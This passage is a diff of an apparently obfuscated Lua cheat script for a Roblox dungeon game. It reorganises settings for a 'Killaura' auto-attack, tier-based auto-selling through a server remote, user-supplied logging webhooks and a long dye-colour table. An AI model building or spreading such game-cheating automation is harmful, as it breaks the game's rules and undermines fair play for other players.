-    end
-end)
-cA:AddInput('mobWepId', {
-    Numeric = false,
-    Finished = true,
-    Text = 'Current Mob Weapon'
-})
-cA:AddInput('bossWepId', {
-    Numeric = false,
-    Finished = true,
-    Text = 'Current Boss Weapon'
-})
-cA:AddButton({
-    Text = 'Set Current Primary for Mobs',
-    Tooltip = 'Killaura will auto equip this weapon when targeting mobs',
-    Func = function()
-        local cO = aZ and aZ:GetChildren()[1]
-        local cP = cO and cO.ID.Value;
-        if cP then
-            Options.mobWepId:SetValue(cP)
-            libNoti('Set ' .. bJ[cO.Name].DisplayKey .. ' as your Mob weapon!')
-        else
-            libNoti('No suitable Primary Weapon Detected')
-        end
-    end,
-    DoubleClick = false
-})
-cA:AddButton({
-    Text = 'Set Current Primary for Bosses',
-    Tooltip = 'Killaura will auto equip this weapon when targeting bosses',
-    Func = function()
-        local cO = aZ and aZ:GetChildren()[1]
-        local cP = cO and cO.ID.Value;
-        if cP then
-            Options.bossWepId:SetValue(cP)
-            libNoti('Set ' .. bJ[cO.Name].DisplayKey .. ' as your Boss weapon!')
-        else
-            libNoti('No suitable Primary Weapon Detected')
-        end
-    end,
-    DoubleClick = false
-})
-cA:AddButton({
-    Text = 'Reset Selected Weapons',
-    Func = function()
-        Options.mobWepId:SetValue('')
-        Options.bossWepId:SetValue('')
-        libNoti('Selected weapons reset!')
-    end,
-    DoubleClick = false
-})
-cE:AddInput('dungeonHook', {
-    Numeric = false,
-    Finished = true,
-    Text = 'Mission Webhook',
-    Tooltip = 'Put your own webhook link to log mission completions/fails'
-})
-cE:AddInput('drophook', {
-    Numeric = false,
-    Finished = true,
-    Text = 'Drop Webhook',
-    Tooltip = 'Put your own webhook link to log T5 drops'
-})
-cE:AddInput('dropHookRoleId', {
-    Numeric = false,
-    Finished = true,
-    Text = 'Custom Role ID for DropHook',
-    Tooltip = 'Mention your chosen role instead of @everyone when getting a desired perk T5'
-})
-cE:AddToggle('anonHook', {
-    Text = 'Anonymous Webhook',
-    Tooltip = "Won't show your User Info in the webhook",
-    Default = false
-})
-cy:AddDropdown('AutoSellTbl', {
-    Text = 'Auto Sell Tiers',
-    Values = {1, 2, 3, 4, 5},
-    AllowNull = true,
-    Multi = true
-})
-cy:AddButton({
-    Text = 'Sell All',
-    Tooltip = 'Sells all weapons and armors of selected tiers',
-    Func = function()
-        local cQ = {}
-        for K, L in bE:GetChildren() do
-            local cR = bJ[L.Name]
-            if (cR.Type == 'Weapon' or cR.Type == 'Armor') and Options.AutoSellTbl.Value[bT:GetItemTier(L)] and
-                not L:FindFirstChild('Locked') then
-                table.insert(cQ, L)
+    end)
+    cI:AddInput('mobWepId', {
+        Numeric = false,
+        Finished = true,
+        Text = 'Current Mob Weapon'
+    })
+    cI:AddInput('bossWepId', {
+        Numeric = false,
+        Finished = true,
+        Text = 'Current Boss Weapon'
+    })
+    cI:AddButton({
+        Text = 'Set Current Primary for Mobs',
+        Tooltip = 'Killaura will auto equip this weapon when targeting mobs',
+        Func = function()
+            local cX = aT and aT:GetChildren()[1]
+            local cY = cX and cX.ID.Value;
+            if cY then
+                Options.mobWepId:SetValue(cY)
+                cq('Set ' .. bL[cX.Name].DisplayKey .. ' as your Mob weapon!')
+            else
+                cq('No suitable Primary Weapon Detected')
+            end
+        end,
+        DoubleClick = false
+    })
+    cI:AddButton({
+        Text = 'Set Current Primary for Bosses',
+        Tooltip = 'Killaura will auto equip this weapon when targeting bosses',
+        Func = function()
+            local cX = aT and aT:GetChildren()[1]
+            local cY = cX and cX.ID.Value;
+            if cY then
+                Options.bossWepId:SetValue(cY)
+                cq('Set ' .. bL[cX.Name].DisplayKey .. ' as your Boss weapon!')
+            else
+                cq('No suitable Primary Weapon Detected')
+            end
+        end,
+        DoubleClick = false
+    })
+    cI:AddButton({
+        Text = 'Reset Selected Weapons',
+        Func = function()
+            Options.mobWepId:SetValue('')
+            Options.bossWepId:SetValue('')
+            cq('Selected weapons reset!')
+        end,
+        DoubleClick = false
+    })
+    cM:AddInput('dungeonHook', {
+        Numeric = false,
+        Finished = true,
+        Text = 'Mission Webhook',
+        Tooltip = 'Put your own webhook link to log mission completions/fails'
+    })
+    cM:AddInput('drophook', {
+        Numeric = false,
+        Finished = true,
+        Text = 'Drop Webhook',
+        Tooltip = 'Put your own webhook link to log T5 drops'
+    })
+    cM:AddInput('dropHookRoleId', {
+        Numeric = false,
+        Finished = true,
+        Text = 'Custom Role ID for DropHook',
+        Tooltip = 'Mention your chosen role instead of @everyone when getting a desired perk T5'
+    })
+    cM:AddToggle('anonHook', {
+        Text = 'Anonymous Webhook',
+        Tooltip = "Won't show your User Info in the webhook",
+        Default = false
+    })
+end
+do
+    cG:AddDropdown('AutoSellTbl', {
+        Text = 'Auto Sell Tiers',
+        Values = {1, 2, 3, 4, 5},
+        AllowNull = true,
+        Multi = true
+    })
+    cG:AddButton({
+        Text = 'Sell All',
+        Tooltip = 'Sells all weapons and armors of selected tiers',
+        Func = function()
+            local cZ = {}
+            for B, C in pairs(bF:GetChildren()) do
+                local c_ = bL[C.Name]
+                if (c_.Type == 'Weapon' or c_.Type == 'Armor') and Options.AutoSellTbl.Value[bZ:GetItemTier(C)] and
+                    not C:FindFirstChild('Locked') then
+                    table.insert(cZ, C)
+                end
+            end
+            if #cZ > 0 then
+                cq('Sold ' .. #cZ .. ' items')
+                S.Drops.SellItems:InvokeServer(cZ)
+            end
+        end,
+        DoubleClick = true
+    })
+    cG:AddToggle('autoSellAll', {
+        Text = 'Auto Sell All',
+        Tooltip = "Failsafe incase auto sell doesn't sell in time at the end of a mission",
+        Default = false
+    })
+    Toggles.autoSellAll:OnChanged(function(cU)
+        if cU then
+            local cZ = {}
+            for B, C in pairs(bF:GetChildren()) do
+                local c_ = bL[C.Name]
+                if (c_.Type == 'Weapon' or c_.Type == 'Armor') and Options.AutoSellTbl.Value[bZ:GetItemTier(C)] and
+                    not C:FindFirstChild('Locked') then
+                    table.insert(cZ, C)
+                end
+            end
+            if #cZ > 0 then
+                cq('Sold ' .. #cZ .. ' items')
+                S.Drops.SellItems:InvokeServer(cZ)
             end
         end
-        if #cQ > 0 then
-            libNoti('Sold ' .. #cQ .. ' items')
-            _.Drops.SellItems:InvokeServer(cQ)
-        end
-    end,
-    DoubleClick = true
-})
-cy:AddToggle('autoSellAll', {
-    Text = 'Auto Sell All',
-    Tooltip = "Failsafe incase auto sell doesn't sell in time at the end of a mission",
-    Default = false
-})
-Toggles.autoSellAll:OnChanged(function(cM)
-    if cM then
-        local cQ = {}
-        for K, L in bE:GetChildren() do
-            local cR = bJ[L.Name]
-            if (cR.Type == 'Weapon' or cR.Type == 'Armor') and Options.AutoSellTbl.Value[bT:GetItemTier(L)] and
-                not L:FindFirstChild('Locked') then
-                table.insert(cQ, L)
+    end)
+    cG:AddToggle('autoSellEggs', {
+        Text = 'Auto Sell Eggs',
+        Default = false,
+        Tooltip = 'Works in Event Wheel Hub also'
+    })
+    cG:AddDivider()
+    cG:AddToggle('smartPerkSell', {
+        Text = 'Smart T5 Auto Sell',
+        Default = false,
+        Tooltip = 'Do NOT enable this until you have turned all of your desired perks slider atleast 1 higher than lowest value'
+    })
+    local d0 = {}
+    for B, C in pairs(bK) do
+        table.insert(d0, C.DisplayName)
+    end
+    table.sort(d0)
+    for B = 1, #d0 do
+        for d1, d2 in pairs(bK) do
+            if d0[B] == d2.DisplayName then
+                cG:AddSlider(d1, {
+                    Text = d2.DisplayName,
+                    Default = math.round(d2.StatRange[1] * 100),
+                    Min = math.round(d2.StatRange[1] * 100),
+                    Max = math.round(d2.StatRange[2] * 100),
+                    Rounding = 0,
+                    HideMax = true,
+                    Compact = true,
+                    Suffix = '%'
+                })
             end
         end
-        if #cQ > 0 then
-            libNoti('Sold ' .. #cQ .. ' items')
-            _.Drops.SellItems:InvokeServer(cQ)
+    end
+end
+do
+    local d3 = {
+        GigaSlimeHead = 'Giga Slime Head',
+        NightTerrorHood = 'Night Terror Hood',
+        FlameDemonHood = 'Flame Demon Hood',
+        SpartanHelmet = 'Mezuvian Helmet',
+        AngelHood = 'Angel Hood',
+        AngelHalo = 'Angel Halo',
+        AngelicWings = 'Angelic Wings',
+        TaurhaStaff = "Taurha's Staff",
+        AetherCrown = 'Aether Crown',
+        W9T5Helmet = 'Aether Helmet'
+    }
+    local d4 = {}
+    for B, C in d3 do
+        table.insert(d4, C)
+    end
+    table.sort(d4)
+    cH:AddDropdown('selectedCosmetics', {
+        Text = 'Select Cosmetics',
+        Values = d4,
+        AllowNull = true,
+        Multi = true
+    })
+    local d5 = {
+        FrostyScarf = 'Frosty Scarf',
+        WolfspiritHelmet = 'Wolfspirit Helmet',
+        WolfspiritArmor = 'Wolfspirit Armor',
+        FestiveDress = 'Festive Dress',
+        RamHorns = 'Ram Horns',
+        CandycaneAntlers = 'Candycane Antlers',
+        CarrotNose = 'Carrot Nose',
+        FluffyJacket = 'Fluffy Jacket'
+    }
+    local d4 = {}
+    for B, C in d5 do
+        table.insert(d4, C)
+    end
+    table.sort(d4)
+    cH:AddDropdown('selectedWheelCosmetics', {
+        Text = 'Select Event Cosmetics',
+        Values = d4,
+        AllowNull = true,
+        Multi = true
+    })
+    local d6 = {{
+        Hex = '#FF1337',
+        Name = 'Rainbow',
+        SpecialType = true
+    }, {
+        Hex = '#DDEADD',
+        Name = 'Ghoul',
+        SpecialType = true
+    }, {
+        Hex = '#11CCEE',
+        Name = 'Ice',
+        SpecialType = true
+    }, {
+        Hex = '#FFADED',
+        Name = 'Faded',
+        SpecialType = true
+    }, {
+        Hex = '#F0F8FF',
+        Name = 'Alice Blue'
+    }, {
+        Hex = '#FAEBD7',
+        Name = 'Antique White'
+    }, {
+        Hex = '#00FFFF',
+        Name = 'Aqua'
+    }, {
+        Hex = '#7FFFD4',
+        Name = 'Aquamarine'
+    }, {
+        Hex = '#F0FFFF',
+        Name = 'Azure'
+    }, {
+        Hex = '#F5F5DC',
+        Name = 'Beige'
+    }, {
+        Hex = '#FFE4C4',
+        Name = 'Bisque'
+    }, {
+        Hex = '#000000',
+        Name = 'Black'
+    }, {
+        Hex = '#FFEBCD',
+        Name = 'Blanched Almond'
+    }, {
+        Hex = '#0000FF',
+        Name = 'Blue'
+    }, {
+        Hex = '#8A2BE2',
+        Name = 'Blue Violet'
+    }, {
+        Hex = '#A52A2A',
+        Name = 'Brown'
+    }, {
+        Hex = '#DEB887',
+        Name = 'Burly Wood'
+    }, {
+        Hex = '#5F9EA0',
+        Name = 'Cadet Blue'
+    }, {
+        Hex = '#7FFF00',
+        Name = 'Chartreuse'
+    }, {
+        Hex = '#D2691E',
+        Name = 'Chocolate'
+    }, {
+        Hex = '#FF7F50',
+        Name = 'Coral'
+    }, {
+        Hex = '#6495ED',
+        Name = 'Cornflower Blue'
+    }, {
+        Hex = '#FFF8DC',
+        Name = 'Cornsilk'
+    }, {
+        Hex = '#DC143C',
+        Name = 'Crimson'
+    }, {
+        Hex = '#00FFFF',
+        Name = 'Cyan'
+    }, {
+        Hex = '#00008B',
+        Name = 'Dark Blue'
+    }, {
+        Hex = '#008B8B',
+        Name = 'Dark Cyan'
+    }, {
+        Hex = '#B8860B',
+        Name = 'Dark Goldenrod'
+    }, {
+        Hex = '#A9A9A9',
+        Name = 'Dark Gray'
+    }, {
+        Hex = '#006400',
+        Name = 'Dark Green'
+    }, {
+        Hex = '#BDB76B',
+        Name = 'Dark Khaki'
+    }, {
+        Hex = '#8B008B',
+        Name = 'Dark Magenta'
+    }, {
+        Hex = '#556B2F',
+        Name = 'Dark Olive Green'
+    }, {
+        Hex = '#FF8C00',
+        Name = 'Dark Orange'
+    }, {
+        Hex = '#9932CC',
+        Name = 'Dark Orchid'
+    }, {
+        Hex = '#8B0000',
+        Name = 'Dark Red'
+    }, {
+        Hex = '#E9967A',
+        Name = 'Dark Salmon'
+    }, {
+        Hex = '#8FBC8F',
+        Name = 'Dark Sea Green'
+    }, {
+        Hex = '#483D8B',
+        Name = 'Dark Slate Blue'
+    }, {
+        Hex = '#2F4F4F',
+        Name = 'Dark Slate Gray'
+    }, {
+        Hex = '#00CED1',
+        Name = 'Dark Turquoise'
+    }, {
+        Hex = '#9400D3',
+        Name = 'Dark Violet'
+    }, {
+        Hex = '#FF1493',
+        Name = 'Deep Pink'
+    }, {
+        Hex = '#00B7EB',
+        Name = 'Deep Sky Blue'
+    }, {
+        Hex = '#696969',
+        Name = 'Dim Gray'
+    }, {
+        Hex = '#1E90FF',
+        Name = 'Dodger Blue'
+    }, {
+        Hex = '#B22222',
+        Name = 'Firebrick'
+    }, {
+        Hex = '#FFFAF0',
+        Name = 'Floral White'
+    }, {
+        Hex = '#228B22',
+        Name = 'Forest Green'
+    }, {
+        Hex = '#FF00FF',
+        Name = 'Fuchsia'
+    }, {
+        Hex = '#DCDCDC',
+        Name = 'Gainsboro'
+    }, {
+        Hex = '#F8F8FF',
+        Name = 'Ghost White'
+    }, {
+        Hex = '#FFD700',
+        Name = 'Gold'
+    }, {
+        Hex = '#DAA520',
+        Name = 'Goldenrod'
+    }, {
+        Hex = '#808080',
+        Name = 'Gray'
+    }, {
+        Hex = '#008000',
+        Name = 'Green'
+    }, {
+        Hex = '#ADFF2F',
+        Name = 'Green Yellow'
+    }, {
+        Hex = '#F0FFF0',
+        Name = 'Honeydew'
+    }, {
+        Hex = '#FF69B4',
+        Name = 'Hot Pink'
+    }, {
+        Hex = '#CD5C5C',
+        Name = 'Indian Red'
+    }, {
+        Hex = '#4B0082',
+        Name = 'Indigo'
+    }, {
+        Hex = '#FFFFF0',
+        Name = 'Ivory'
+    }, {
+        Hex = '#F0E68C',
+        Name = 'Khaki'
+    }, {
+        Hex = '#E6E6FA',
+        Name = 'Lavender'
+    }, {
+        Hex = '#FFF0F5',
+        Name = 'Lavender Blush'
+    }, {
+        Hex = '#7CFC00',
+        Name = 'Lawn Green'
+    }, {
+        Hex = '#FFFACD',
+        Name = 'Lemon Chiffon'
+    }, {
+        Hex = '#ADD8E6',
+        Name = 'Light Blue'
+    }, {
+        Hex = '#F08080',
+        Name = 'Light Coral'
+    }, {
+        Hex = '#E0FFFF',
+        Name = 'Light Cyan'
+    }, {
+        Hex = '#FAFAD2',
+        Name = 'Light Goldenrod Yellow'
+    }, {
+        Hex = '#D3D3D3',
+        Name = 'Light Gray'
+    }, {
+        Hex = '#90EE90',
+        Name = 'Light Green'
+    }, {
+        Hex = '#FFB6C1',
+        Name = 'Light Pink'
+    }, {
+        Hex = '#FFA07A',
+        Name = 'Light Salmon'
+    }, {
+        Hex = '#20B2AA',
+        Name = 'Light Sea Green'
+    }, {
+        Hex = '#87CEFA',
+        Name = 'Light Sky Blue'
+    }, {
+        Hex = '#778899',
+        Name = 'Light Slate Gray'
+    }, {
+        Hex = '#B0C4DE',
+        Name = 'Light Steel Blue'
+    }, {
+        Hex = '#FFFFE0',
+        Name = 'Light Yellow'
+    }, {
+        Hex = '#00FF00',
+        Name = 'Lime'
+    }, {
+        Hex = '#32CD32',
+        Name = 'Lime Green'
+    }, {
+        Hex = '#FAF0E6',
+        Name = 'Linen'
+    }, {
+        Hex = '#FF00FF',
+        Name = 'Magenta'
+    }, {
+        Hex = '#800000',
+        Name = 'Maroon'
+    }, {
+        Hex = '#66CDAA',
+        Name = 'Medium Aquamarine'
+    }, {
+        Hex = '#0000CD',
+        Name = 'Medium Blue'
+    }, {
+        Hex = '#BA55D3',
+        Name = 'Medium Orchid'
+    }, {
+        Hex = '#9370DB',
+        Name = 'Medium Purple'
+    }, {
+        Hex = '#3CB371',
+        Name = 'Medium Sea Green'
+    }, {
+        Hex = '#7B68EE',
+        Name = 'Medium Slate Blue'
+    }, {
+        Hex = '#00FA9A',
+        Name = 'Medium Spring Green'
+    }, {
+        Hex = '#48D1CC',
+        Name = 'Medium Turquoise'
+    }, {
+        Hex = '#C71585',
+        Name = 'Medium Violet Red'
+    }, {
+        Hex = '#191970',
+        Name = 'Midnight Blue'
+    }, {
+        Hex = '#F5FFFA',
+        Name = 'Mint Cream'
+    }, {
+        Hex = '#FFE4E1',
+        Name = 'Misty Rose'
+    }, {
+        Hex = '#FFE4B5',
+        Name = 'Moccasin'
+    }, {
+        Hex = '#FFDEAD',
+        Name = 'Navajo White'
+    }, {
+        Hex = '#000080',
+        Name = 'Navy'
+    }, {
+        Hex = '#FDF5E6',
+        Name = 'Old Lace'
+    }, {
+        Hex = '#808000',
+        Name = 'Olive'
+    }, {
+        Hex = '#6B8E23',
+        Name = 'Olive Drab'
+    }, {
+        Hex = '#FFA500',
+        Name = 'Orange'
+    }, {
+        Hex = '#FF4500',
+        Name = 'Orange Red'
+    }, {
+        Hex = '#DA70D6',
+        Name = 'Orchid'
+    }, {
+        Hex = '#EEE8AA',
+        Name = 'Pale Goldenrod'
+    }, {
+        Hex = '#98FB98',
+        Name = 'Pale Green'
+    }, {
+        Hex = '#AFEEEE',
+        Name = 'Pale Turquoise'
+    }, {
+        Hex = '#DB7093',
+        Name = 'Pale Violet Red'
+    }, {
+        Hex = '#FFEFD5',
+        Name = 'Papaya Whip'
+    }, {
+        Hex = '#FFDAB9',
+        Name = 'Peach Puff'
+    }, {
+        Hex = '#CD853F',
+        Name = 'Peru'
+    }, {
+        Hex = '#FFC0CB',
+        Name = 'Pink'
+    }, {
+        Hex = '#DDA0DD',
+        Name = 'Plum'
+    }, {
+        Hex = '#B0E0E6',
+        Name = 'Powder Blue'
+    }, {
+        Hex = '#800080',
+        Name = 'Purple'
+    }, {
+        Hex = '#FF0000',
+        Name = 'Red'
+    }, {
+        Hex = '#BC8F8F',
+        Name = 'Rosy Brown'
+    }, {
+        Hex = '#4169E1',
+        Name = 'Royal Blue'
+    }, {
+        Hex = '#8B4513',
+        Name = 'Saddle Brown'
+    }, {
+        Hex = '#FA8072',
+        Name = 'Salmon'
+    }, {
+        Hex = '#F4A460',
+        Name = 'Sandy Brown'
+    }, {
+        Hex = '#2E8B57',
+        Name = 'Sea Green'
+    }, {
+        Hex = '#FFF5EE',
+        Name = 'Sea Shell'
+    }, {
+        Hex = '#A0522D',
+        Name = 'Sienna'
+    }, {
+        Hex = '#C0C0C0',
+        Name = 'Silver'
+    }, {
+        Hex = '#87CEEB',
+        Name = 'Sky Blue'
+    }, {
+        Hex = '#6A5ACD',
+        Name = 'Slate Blue'
+    }, {
+        Hex = '#708090',
+        Name = 'Slate Gray'
+    }, {
+        Hex = '#FFFAFA',
+        Name = 'Snow'
+    }, {
+        Hex = '#00FF7F',
+        Name = 'Spring Green'
+    }, {
+        Hex = '#4682B4',
+        Name = 'Steel Blue'
+    }, {
+        Hex = '#D2B48C',
+        Name = 'Tan'
+    }, {
+        Hex = '#008080',
+        Name = 'Teal'
+    }, {
+        Hex = '#D8BFD8',
+        Name = 'Thistle'
+    }, {
+        Hex = '#FF6347',
+        Name = 'Tomato'
+    }, {
+        Hex = '#40E0D0',
+        Name = 'Turquoise'
+    }, {
+        Hex = '#EE82EE',
+        Name = 'Violet'
+    }, {
+        Hex = '#F5DEB3',
+        Name = 'Wheat'
+    }, {
+        Hex = '#FFFFFF',
+        Name = 'White'
+    }, {
+        Hex = '#F5F5F5',
+        Name = 'White Smoke'
+    }, {
+        Hex = '#FFFF00',
+        Name = 'Yellow'
+    }, {
+        Hex = '#9ACD32',
+        Name = 'Yellow Green'
+    }}
+    local d4 = {}
+    for B, C in d6 do
+        table.insert(d4, C.Name)
+    end
+    table.sort(d4)
+    cH:AddDropdown('selectedDyes', {
+        Text = 'Select Desired Dyes',
+        Tooltip = "Event wheel items with these dyes or close to these dyes won't be sold/recycled",
+        Values = d4,
+        AllowNull = true,
+        Default = {'Rainbow', 'Ghoul', 'Ice', 'Faded', 'Black', 'White'},
+        Multi = true
+    })
+    cH:AddSlider('colorDistanceThreshold', {
+        Text = 'Color Distance Threshold',
+        Tooltip = 'Keep dyes that are close to your desired dyes',
+        Default = 100,
+        Min = 0,
+        Max = 200,
+        Rounding = 0,
+        HideMax = true,
+        Compact = true
+    })
+    cH:AddToggle('autoSellCosmetics', {
+        Text = 'Auto Sell Cosmetics',
+        Default = false
+    })
+    Toggles.autoSellCosmetics:OnChanged(function(cU)
+        if cU and Toggles.autoRecycleCosmetics.Value then
+            Toggles.autoRecycleCosmetics:SetValue(false)
         end
-    end
-end)
-cy:AddToggle('autoSellEggs', {
-    Text = 'Auto Sell Eggs',
-    Default = false,
-    Tooltip = 'Works in Event Wheel Hub also'
-})
-cy:AddDivider()
-cy:AddToggle('smartPerkSell', {
-    Text = 'Smart T5 Auto Sell',
-    Default = false,
-    Tooltip = 'Do NOT enable this until you have turned all of your desired perks slider atleast 1 higher than lowest value'
-})
-local cS = {}
-for K, L in bI do
-    table.insert(cS, L.DisplayName)
-end
-table.sort(cS)
-for K = 1, #cS do
-    for cT, cU in bI do
-        if cS[K] == cU.DisplayName then
-            cy:AddSlider(cT, {
-                Text = cU.DisplayName,
-                Default = math.round(cU.StatRange[1] * 100),
-                Min = math.round(cU.StatRange[1] * 100),
-                Max = math.round(cU.StatRange[2] * 100),
-                Rounding = 0,
-                HideMax = true,
-                Compact = true,
-                Suffix = '%'
-            })
+    end)
+    cH:AddToggle('autoRecycleCosmetics', {
+        Text = 'Auto Recycle Cosmetics',
+        Default = false
+    })
+    Toggles.autoRecycleCosmetics:OnChanged(function(cU)
+        if cU and Toggles.autoSellCosmetics.Value then
+            Toggles.autoSellCosmetics:SetValue(false)
         end
+    end)
+    local function d7(d8)
+        local d9 = math.floor(d8.R * 255 + 0.5)
+        local da = math.floor(d8.G * 255 + 0.5)
+        local db = math.floor(d8.B * 255 + 0.5)
+        return string.format("#%02X%02X%02X", d9, da, db)
     end
-end
-local cV = {
-    GigaSlimeHead = 'Giga Slime Head',
-    NightTerrorHood = 'Night Terror Hood',
-    FlameDemonHood = 'Flame Demon Hood',
-    SpartanHelmet = 'Mezuvian Helmet',
-    AngelHood = 'Angel Hood',
-    AngelHalo = 'Angel Halo',
-    AngelicWings = 'Angelic Wings',
-    TaurhaStaff = "Taurha's Staff",
-    AetherCrown = 'Aether Crown',
-    W9T5Helmet = 'Aether Helmet'
-}
-local cW = {}
-for K, L in cV do
-    table.insert(cW, L)
-end
-table.sort(cW)
-cz:AddDropdown('selectedCosmetics', {
-    Text = 'Select Cosmetics',
-    Values = cW,
-    AllowNull = true,
-    Multi = true
-})
-local cX = {
-    FrostyScarf = 'Frosty Scarf',
-    WolfspiritHelmet = 'Wolfspirit Helmet',
-    WolfspiritArmor = 'Wolfspirit Armor',
-    FestiveDress = 'Festive Dress',
-    RamHorns = 'Ram Horns',
-    CandycaneAntlers = 'Candycane Antlers',
-    CarrotNose = 'Carrot Nose',
-    FluffyJacket = 'Fluffy Jacket'
-}
-local cW = {}
-for K, L in cX do
-    table.insert(cW, L)
-end
-table.sort(cW)
-cz:AddDropdown('selectedWheelCosmetics', {
-    Text = 'Select Event Cosmetics',
-    Values = cW,
-    AllowNull = true,
-    Multi = true
-})
-local cY = {{
-    Hex = '#FF1337',
-    Name = 'Rainbow',
-    SpecialType = true
-}, {
-    Hex = '#DDEADD',
-    Name = 'Ghoul',
-    SpecialType = true
-}, {
-    Hex = '#11CCEE',
-    Name = 'Ice',
-    SpecialType = true
-}, {
-    Hex = '#FFADED',
-    Name = 'Faded',
-    SpecialType = true
-}, {
-    Hex = '#F0F8FF',
-    Name = 'Alice Blue'
-}, {
-    Hex = '#FAEBD7',
-    Name = 'Antique White'
-}, {
-    Hex = '#00FFFF',
-    Name = 'Aqua'
-}, {
-    Hex = '#7FFFD4',
-    Name = 'Aquamarine'
-}, {
-    Hex = '#F0FFFF',
-    Name = 'Azure'
-}, {
-    Hex = '#F5F5DC',
-    Name = 'Beige'
-}, {
-    Hex = '#FFE4C4',
-    Name = 'Bisque'
-}, {
-    Hex = '#000000',
-    Name = 'Black'
-}, {
-    Hex = '#FFEBCD',
-    Name = 'Blanched Almond'
-}, {
-    Hex = '#0000FF',
-    Name = 'Blue'
-}, {
-    Hex = '#8A2BE2',
-    Name = 'Blue Violet'
-}, {
-    Hex = '#A52A2A',
-    Name = 'Brown'
-}, {
-    Hex = '#DEB887',
-    Name = 'Burly Wood'
-}, {
-    Hex = '#5F9EA0',
-    Name = 'Cadet Blue'
-}, {
-    Hex = '#7FFF00',
-    Name = 'Chartreuse'
-}, {
-    Hex = '#D2691E',
-    Name = 'Chocolate'
-}, {
-    Hex = '#FF7F50',
-    Name = 'Coral'
-}, {
-    Hex = '#6495ED',
-    Name = 'Cornflower Blue'
-}, {
-    Hex = '#FFF8DC',
-    Name = 'Cornsilk'
-}, {
-    Hex = '#DC143C',
-    Name = 'Crimson'
-}, {
-    Hex = '#00FFFF',
-    Name = 'Cyan'
-}, {
-    Hex = '#00008B',
-    Name = 'Dark Blue'
-}, {
-    Hex = '#008B8B',
-    Name = 'Dark Cyan'
-}, {
-    Hex = '#B8860B',
-    Name = 'Dark Goldenrod'
-}, {
-    Hex = '#A9A9A9',
-    Name = 'Dark Gray'
-}, {
-    Hex = '#006400',
-    Name = 'Dark Green'
-}, {
-    Hex = '#BDB76B',
-    Name = 'Dark Khaki'
-}, {
-    Hex = '#8B008B',
-    Name = 'Dark Magenta'
-}, {
-    Hex = '#556B2F',
-    Name = 'Dark Olive Green'
-}, {
-    Hex = '#FF8C00',
-    Name = 'Dark Orange'
-}, {
-    Hex = '#9932CC',
-    Name = 'Dark Orchid'
-}, {
-    Hex = '#8B0000',
-    Name = 'Dark Red'
-}, {
-    Hex = '#E9967A',
-    Name = 'Dark Salmon'
-}, {
-    Hex = '#8FBC8F',
-    Name = 'Dark Sea Green'
-}, {
-    Hex = '#483D8B',
-    Name = 'Dark Slate Blue'
-}, {
-    Hex = '#2F4F4F',
-    Name = 'Dark Slate Gray'
-}, {
-    Hex = '#00CED1',
-    Name = 'Dark Turquoise'
-}, {
-    Hex = '#9400D3',
-    Name = 'Dark Violet'
-}, {
-    Hex = '#FF1493',
-    Name = 'Deep Pink'
-}, {
-    Hex = '#00B7EB',
-    Name = 'Deep Sky Blue'
-}, {
-    Hex = '#696969',
-    Name = 'Dim Gray'
-}, {
-    Hex = '#1E90FF',
-    Name = 'Dodger Blue'
-}, {
-    Hex = '#B22222',
-    Name = 'Firebrick'
-}, {
-    Hex = '#FFFAF0',
-    Name = 'Floral White'
-}, {
-    Hex = '#228B22',
-    Name = 'Forest Green'
-}, {
-    Hex = '#FF00FF',
-    Name = 'Fuchsia'
-}, {
-    Hex = '#DCDCDC',
-    Name = 'Gainsboro'
-}, {
-    Hex = '#F8F8FF',
-    Name = 'Ghost White'
-}, {
-    Hex = '#FFD700',
-    Name = 'Gold'
-}, {
-    Hex = '#DAA520',
-    Name = 'Goldenrod'
-}, {
-    Hex = '#808080',
-    Name = 'Gray'
-}, {
-    Hex = '#008000',
-    Name = 'Green'
-}, {
-    Hex = '#ADFF2F',
-    Name = 'Green Yellow'
-}, {
-    Hex = '#F0FFF0',
-    Name = 'Honeydew'
-}, {
-    Hex = '#FF69B4',
-    Name = 'Hot Pink'
-}, {
-    Hex = '#CD5C5C',
-    Name = 'Indian Red'
-}, {
-    Hex = '#4B0082',
-    Name = 'Indigo'
-}, {
-    Hex = '#FFFFF0',
-    Name = 'Ivory'
-}, {
-    Hex = '#F0E68C',
-    Name = 'Khaki'
-}, {
-    Hex = '#E6E6FA',
-    Name = 'Lavender'
-}, {
-    Hex = '#FFF0F5',
-    Name = 'Lavender Blush'
-}, {
-    Hex = '#7CFC00',
-    Name = 'Lawn Green'
-}, {
-    Hex = '#FFFACD',
-    Name = 'Lemon Chiffon'
-}, {
-    Hex = '#ADD8E6',
-    Name = 'Light Blue'
-}, {
-    Hex = '#F08080',
-    Name = 'Light Coral'
-}, {
-    Hex = '#E0FFFF',
-    Name = 'Light Cyan'
-}, {
-    Hex = '#FAFAD2',
-    Name = 'Light Goldenrod Yellow'
-}, {
-    Hex = '#D3D3D3',
-    Name = 'Light Gray'
-}, {
-    Hex = '#90EE90',
-    Name = 'Light Green'
-}, {
-    Hex = '#FFB6C1',
-    Name = 'Light Pink'
-}, {
-    Hex = '#FFA07A',
-    Name = 'Light Salmon'
-}, {
-    Hex = '#20B2AA',
-    Name = 'Light Sea Green'
-}, {
-    Hex = '#87CEFA',
-    Name = 'Light Sky Blue'
-}, {
-    Hex = '#778899',
-    Name = 'Light Slate Gray'
-}, {
-    Hex = '#B0C4DE',
-    Name = 'Light Steel Blue'
-}, {
-    Hex = '#FFFFE0',
-    Name = 'Light Yellow'
-}, {
-    Hex = '#00FF00',
-    Name = 'Lime'
-}, {
-    Hex = '#32CD32',
-    Name = 'Lime Green'
-}, {
-    Hex = '#FAF0E6',
-    Name = 'Linen'
-}, {
-    Hex = '#FF00FF',
-    Name = 'Magenta'
-}, {
-    Hex = '#800000',
-    Name = 'Maroon'
-}, {
-    Hex = '#66CDAA',
-    Name = 'Medium Aquamarine'
-}, {
-    Hex = '#0000CD',
-    Name = 'Medium Blue'
-}, {
-    Hex = '#BA55D3',
-    Name = 'Medium Orchid'
-}, {
-    Hex = '#9370DB',
-    Name = 'Medium Purple'
-}, {
-    Hex = '#3CB371',
-    Name = 'Medium Sea Green'
-}, {
-    Hex = '#7B68EE',
-    Name = 'Medium Slate Blue'
-}, {
-    Hex = '#00FA9A',
-    Name = 'Medium Spring Green'
-}, {
-    Hex = '#48D1CC',
-    Name = 'Medium Turquoise'
-}, {
-    Hex = '#C71585',
-    Name = 'Medium Violet Red'
-}, {
-    Hex = '#191970',
-    Name = 'Midnight Blue'
-}, {
-    Hex = '#F5FFFA',
-    Name = 'Mint Cream'
-}, {
-    Hex = '#FFE4E1',
-    Name = 'Misty Rose'
-}, {
-    Hex = '#FFE4B5',
